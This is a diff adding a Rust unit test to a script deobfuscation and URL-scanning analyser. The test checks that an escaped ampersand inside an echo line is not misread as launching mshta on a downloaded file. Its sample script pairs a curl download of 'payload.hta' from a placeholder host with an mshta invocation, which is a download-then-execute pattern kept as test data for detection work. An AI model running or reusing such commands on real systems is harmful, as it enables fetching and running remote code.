@@ -35015,6 +35015,24 @@ mod deob_url_scan_tests {
     }
 
     #[test]
+    fn escaped_ampersand_mshta_local_text_does_not_resolve_download_url() {
+        let script = br#"curl -o payload.hta https://mshta-deob-local.example/echoed.hta
+echo keep ^& mshta payload.hta"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "echo keep & mshta payload.hta"
+                        && url == "https://mshta-deob-local.example/echoed.hta"
+            )),
+            "escaped ampersand echo text was misread as mshta local execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn explicit_url_launch_emits_url_launch_without_generic_duplicate() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
